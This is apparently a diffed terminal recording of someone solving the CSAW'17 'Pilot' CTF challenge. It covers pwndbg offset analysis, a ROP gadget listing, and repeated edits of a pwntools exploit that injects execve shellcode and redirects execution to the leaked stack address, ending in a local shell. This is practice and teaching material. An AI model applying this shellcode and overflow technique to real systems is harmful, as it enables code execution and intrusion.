+   0x400aff:	mov    esi,0x400890
+   0x400b04:	mov    rdi,rax
+   0x400b07:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400b0c:	mov    esi,0x400dad
+   0x400b11:	mov    edi,0x6020a0
+   0x400b16:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400b1b:	mov    esi,0x400890
+   0x400b20:	mov    rdi,rax
+   0x400b23:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400b28:	mov    eax,0xffffffff
+   0x400b2d:	jmp    0x400b34
+   0x400b2f:	mov    eax,0x0
+   0x400b34:	leave
+   0x400b35:	ret
+   0x400b36:	push   rbp
+   0x400b37:	mov    rbp,rsp
+   0x400b3a:	sub    rsp,0x10
+   0x400b3e:	mov    DWORD PTR [rbp-0x4],edi
+   0x400b41:	mov    DWORD PTR [rbp-0x8],esi
+   0x400b44:	cmp    DWORD PTR [rbp-0x4],0x1
+   0x400b48:	jne    0x400b71
+   0x400b4a:	cmp    DWORD PTR [rbp-0x8],0xffff
+   0x400b51:	jne    0x400b71
+pwndbg> b *0x400ae5
+Breakpoint 2 at 0x400ae5
+pwndbg> c
+Continuing.
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fffffffdb70
+[*]Command:AAAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x0000000000400ae5 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
+*RAX  0x12
+ RBX  0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+*RCX  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
+*RDX  0x12
+*RDI  0
+*RSI  0x7fffffffdb70 ◂— 'AAAAAAAAAAAAAAAAA\n`'
+*R8   0
+*R9   0
+*R10  0
+*R11  0x202
+ R12  0
+ R13  0x7fffffffdcb8 —▸ 0x7fffffffe080 ◂— 0x5245545f5353454c ('LESS_TER')
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
+ R15  0
+*RBP  0x7fffffffdb90 ◂— 1
+*RSP  0x7fffffffdb70 ◂— 'AAAAAAAAAAAAAAAAA\n`'
+*RIP  0x400ae5 ◂— cmp rax, 4
+──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────
+ ► 0x400ae5                                       cmp    rax, 4     0x12 - 0x4     EFLAGS => 0x212 [ cf pf AF zf sf IF df of ac ]
+   0x400ae9                                       setle  al
+   0x400aec                                       test   al, al     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x400aee                                     ✔ je     0x400b2f                    <0x400b2f>
+    ↓
+   0x400b2f                                       mov    eax, 0     EAX => 0
+   0x400b34                                       leave  
+   0x400b35                                       ret                                <__libc_start_call_main+120>
+    ↓
+   0x7ffff7a33ca8 <__libc_start_call_main+120>    mov    edi, eax     EDI => 0
+   0x7ffff7a33caa <__libc_start_call_main+122>    call   exit                        <exit>
+ 
+   0x7ffff7a33caf <__libc_start_call_main+127>    call   __nptl_deallocate_tsd       <__nptl_deallocate_tsd>
+ 
+   0x7ffff7a33cb4 <__libc_start_call_main+132>    lock sub dword ptr [rip + 0x1bd414], 1
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ rsi rsp 0x7fffffffdb70 ◂— 'AAAAAAAAAAAAAAAAA\n`'
+01:0008│-018     0x7fffffffdb78 ◂— 'AAAAAAAAA\n`'
+02:0010│-010     0x7fffffffdb80 ◂— 0x600a41 /* 'A\n`' */
+03:0018│-008     0x7fffffffdb88 —▸ 0x7ffff7a4bb38 (__internal_atexit+56) ◂— test rax, rax
+04:0020│ rbp     0x7fffffffdb90 ◂— 1
+05:0028│+008     0x7fffffffdb98 —▸ 0x7ffff7a33ca8 (__libc_start_call_main+120) ◂— mov edi, eax
+06:0030│+010     0x7fffffffdba0 —▸ 0x7fffffffdbe0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
+07:0038│+018     0x7fffffffdba8 —▸ 0x4009a6 ◂— push rbp
+──────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
+ ► 0         0x400ae5 None
+   1   0x7ffff7a33ca8 __libc_start_call_main+120
+   2   0x7ffff7a33d65 __libc_start_main+133
+   3         0x4008d9 None
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/20gx $rbp-0x20
+0x7fffffffdb70:	0x4141414141414141	0x4141414141414141
+0x7fffffffdb80:	0x0000000000600a41	0x00007ffff7a4bb38
+0x7fffffffdb90:	0x0000000000000001	0x00007ffff7a33ca8
+0x7fffffffdba0:	0x00007fffffffdbe0	0x00000000004009a6
+0x7fffffffdbb0:	0x00000001ffffdbe0	0x00007fffffffdca8
+0x7fffffffdbc0:	0x00007fffffffdca8	0xdafc5118b81c5a37
+0x7fffffffdbd0:	0x0000000000000000	0x00007fffffffdcb8
+0x7fffffffdbe0:	0x00007ffff7ffd000	0x0000000000000000
+0x7fffffffdbf0:	0x2503aee70f5e5a37	0x2503be5ec0de5a37
+0x7fffffffdc00:	0x0000000000000000	0x0000000000000000
+pwndbg> info frame
+Stack level 0, frame at 0x7fffffffdba0:
+ rip = 0x400ae5; saved rip = 0x7ffff7a33ca8
+ called by frame at 0x7fffffffdc40
+ Arglist at 0x7fffffffdb68, args: 
+ Locals at 0x7fffffffdb68, Previous frame's sp is 0x7fffffffdba0
+ Saved registers:
+  rbp at 0x7fffffffdb90, rip at 0x7fffffffdb98
+pwndbg> p 0x7fffffffdb98 - 0x7fffffffdb70
+$1 = 40
+pwndbg> exit
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ ./pilot
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7ffd158c0120
+[*]Command:^C
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ ./pilot
+[*]Welcome DropShip Pilot...
+[*]I am your assitant A.I....
+[*]I will be guiding you through the tutorial....
+[*]As a first step, lets learn how to land at the designated location....
+[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
+[*]Good Luck Pilot!....
+[*]Location:0x7fff578cb820
+[*]Command:^C
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat > exp.py    
+from pwn import *
+shell = "^C
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ ROPgadget --binary pilot | grep ret     
+0x0000000000400b6a : add al, bpl ; iretd
+0x0000000000400b6b : add al, ch ; iretd
+0x0000000000400bff : add bl, dh ; ret
+0x0000000000400bfd : add byte ptr [rax], al ; add bl, dh ; ret
+0x0000000000400bfb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
+0x0000000000400b30 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x000000000040090c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
+0x0000000000400bfc : add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
+0x0000000000400b31 : add byte ptr [rax], al ; add cl, cl ; ret
+0x00000000004007db : add byte ptr [rax], al ; add rsp, 8 ; ret
+0x0000000000400b32 : add byte ptr [rax], al ; leave ; ret
+0x000000000040090e : add byte ptr [rax], al ; pop rbp ; ret
+0x0000000000400bfe : add byte ptr [rax], al ; repz ret
+0x0000000000400978 : add byte ptr [rcx], al ; repz ret
+0x0000000000400b33 : add cl, cl ; ret
+0x0000000000400974 : add eax, 0x20183e ; add ebx, esi ; ret
+0x0000000000400b2e : add eax, 0xb8 ; add cl, cl ; ret
+0x0000000000400979 : add ebx, esi ; ret
+0x00000000004007de : add esp, 8 ; ret
+0x00000000004007dd : add rsp, 8 ; ret
+0x0000000000400977 : and byte ptr [rax], al ; add ebx, esi ; ret
+0x0000000000400aa0 : dec dword ptr [rax - 0x77] ; ret 0x8d48
+0x0000000000400bdc : fmul qword ptr [rax - 0x7d] ; ret
+0x0000000000400b6d : iretd
+0x0000000000400b34 : leave ; ret
+0x0000000000400973 : mov byte ptr [rip + 0x20183e], 1 ; repz ret
+0x0000000000400b2f : mov eax, 0 ; leave ; ret
+0x0000000000400b71 : nop ; leave ; ret
+0x0000000000400908 : nop dword ptr [rax + rax] ; pop rbp ; ret
+0x0000000000400bf8 : nop dword ptr [rax + rax] ; repz ret
+0x0000000000400955 : nop dword ptr [rax] ; pop rbp ; ret
+0x0000000000400bec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400bee : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400bf0 : pop r14 ; pop r15 ; ret
+0x0000000000400bf2 : pop r15 ; ret
+0x0000000000400972 : pop rbp ; mov byte ptr [rip + 0x20183e], 1 ; repz ret
+0x0000000000400beb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400bef : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400910 : pop rbp ; ret
+0x0000000000400bf3 : pop rdi ; ret
+0x0000000000400bf1 : pop rsi ; pop r15 ; ret
+0x0000000000400bed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040097a : repz ret
+0x00000000004007d9 : ret
+0x0000000000400aa3 : ret 0x8d48
+0x0000000000400892 : retf 0x2017
+0x0000000000400976 : sbb byte ptr [rax], ah ; add byte ptr [rcx], al ; repz ret
+0x0000000000400975 : sbb byte ptr ds:[rax], ah ; add byte ptr [rcx], al ; repz ret
+0x0000000000400c05 : sub esp, 8 ; add rsp, 8 ; ret
+0x0000000000400c04 : sub rsp, 8 ; add rsp, 8 ; ret
+0x000000000040090a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
+0x0000000000400bfa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ 0x00000000004007d9
+0x00000000004007d9: command not found
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat > exp.py
+from pwn import *
+shellcode = b"\x00" * 10 
+shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil("[*]Location:"))
+leak = p.recvline()
+inp_addr = leak.strip("\n")
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) //ret gadget for stack allignement
+pay += p64(leak)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+^C
+                                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat exp.py 
+from pwn import *
+shellcode = b"\x00" * 10
+shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil("b[*]Location:"))
+leak = p.recvline()
+inp_addr = leak.strip("\n")
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) //ret gadget for stack allignement
+pay += p64(leak)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+                                                                                                
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ source ~/ctf/bin/activate                      
+                                                                                                
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py                                  
+  File "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py", line 13
+    pay += p64(0x04007d9) //ret gadget for stack allignement
+                                ^^^^^^
+SyntaxError: invalid syntax
+                                                                                                
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat exp.py
+from pwn import *
+shellcode = b"\x00" * 10
+shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil("b[*]Location:"))
+leak = p.recvline()
+inp_addr = leak.strip("\n")
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) #ret gadget for stack allignement
+pay += p64(leak)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+                                                                                                
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 65229
+/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(p.recvuntil("b[*]Location:"))
+
+^CTraceback (most recent call last):
+  File "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py", line 6, in <module>
+    print(p.recvuntil("b[*]Location:"))
+          ~~~~~~~~~~~^^^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ~~~~~~~~~~^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 717, in recv_raw
+    if not self.can_recv_raw(self.timeout):
+           ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 778, in can_recv_raw
+    return select.select([self.proc.stdout], [], [], timeout) == ([self.proc.stdout], [], [])
+           ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+[*] Stopped process './pilot' (pid 65229)
+
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 65511
+/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(p.recvuntil("b[*]Location:"))
+^CTraceback (most recent call last):
+  File "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py", line 6, in <module>
+    print(p.recvuntil("b[*]Location:"))
+          ~~~~~~~~~~~^^^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ~~~~~~~~~~^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 717, in recv_raw
+    if not self.can_recv_raw(self.timeout):
+           ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 778, in can_recv_raw
+    return select.select([self.proc.stdout], [], [], timeout) == ([self.proc.stdout], [], [])
+           ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+[*] Stopped process './pilot' (pid 65511)
+
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 65904
+/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(p.recvuntil("b[*]Location:"))
+^CTraceback (most recent call last):
+  File "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py", line 6, in <module>
+    print(p.recvuntil("b[*]Location:"))
+          ~~~~~~~~~~~^^^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
+    res = self.recv(timeout=self.timeout)
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 106, in recv
+    return self._recv(numb, timeout) or b''
+           ~~~~~~~~~~^^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 176, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 717, in recv_raw
+    if not self.can_recv_raw(self.timeout):
+           ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^
+  File "/home/himanshu/ctf/lib/python3.13/site-packages/pwnlib/tubes/process.py", line 778, in can_recv_raw
+    return select.select([self.proc.stdout], [], [], timeout) == ([self.proc.stdout], [], [])
+           ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+[*] Stopped process './pilot' (pid 65904)
+
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat exp.py
+from pwn import *
+shellcode = b"\x00" * 10
+shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil("b[*]Location:"))
+leak = p.recvline().strip()
+inp_addr = int(leak , 16)
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) #ret gadget for stack allignement
+pay += p64(leak)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat exp.py
+from pwn import *
+shellcode = b"\x00" * 10
+shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil(b"[*]Location:"))
+leak = p.recvline().strip()
+inp_addr = int(leak , 16)
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) #ret gadget for stack allignement
+pay += p64(inp_addr)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 66754
+b'[*]Welcome DropShip Pilot...\n[*]I am your assitant A.I....\n[*]I will be guiding you through the tutorial....\n[*]As a first step, lets learn how to land at the designated location....\n[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...\n[*]Good Luck Pilot!....\n[*]Location:'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ ls
+[*] Process './pilot' stopped with exit code -11 (SIGSEGV) (pid 66754)
+[*] Got EOF while sending in interactive
+                                                                                                                                                        
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 66949
+b'[*]Welcome DropShip Pilot...\n[*]I am your assitant A.I....\n[*]I will be guiding you through the tutorial....\n[*]As a first step, lets learn how to land at the designated location....\n[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...\n[*]Good Luck Pilot!....\n[*]Location:'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './pilot' stopped with exit code -11 (SIGSEGV) (pid 66949)
+[*] Got EOF while sending in interactive
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 67116
+b'[*]Welcome DropShip Pilot...\n[*]I am your assitant A.I....\n[*]I will be guiding you through the tutorial....\n[*]As a first step, lets learn how to land at the designated location....\n[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...\n[*]Good Luck Pilot!....\n[*]Location:'
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ ls
+[*] Process './pilot' stopped with exit code -11 (SIGSEGV) (pid 67116)
+[*] Got EOF while sending in interactive
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+Traceback (most recent call last):
+  File "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/exp.py", line 3, in <module>
+    shellcode += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+    ^^^^^^^^^
+NameError: name 'shellcode' is not defined
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ vim exp.py
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ python exp.py
+[+] Starting local process './pilot': pid 67442
+b'[*]Welcome DropShip Pilot...\n[*]I am your assitant A.I....\n[*]I will be guiding you through the tutorial....\n[*]As a first step, lets learn how to land at the designated location....\n[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...\n[*]Good Luck Pilot!....\n[*]Location:'
+[*] Switching to interactive mode
+$ ls
+core.66754  core.66949	core.67116  exp.py  ghidra.txt	pilot  pilot.cast
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './pilot' stopped with exit code 0 (pid 67442)
+[*] Got EOF while sending in interactive
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat exp.py
+from pwn import *
+
+shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+p = process("./pilot")
+print(p.recvuntil(b"[*]Location:"))
+leak = p.recvline().strip()
+inp_addr = int(leak , 16)
+
+pay = b""
+pay += shellcode
+pay += b"A" * (40 - len(shellcode))
+pay += p64(0x04007d9) #ret gadget for stack allignement
+pay += p64(inp_addr)
+
+p.recvuntil(b"Command:")
+p.sendline(pay)
+p.interactive()
+                                                                                                                                                                                                      
+┌──(ctf)─(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ exit
+asciinema: recording finished
+asciinema: asciicast saved to pilot.cast
+                                                                                                                                                                                                      
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ 
+
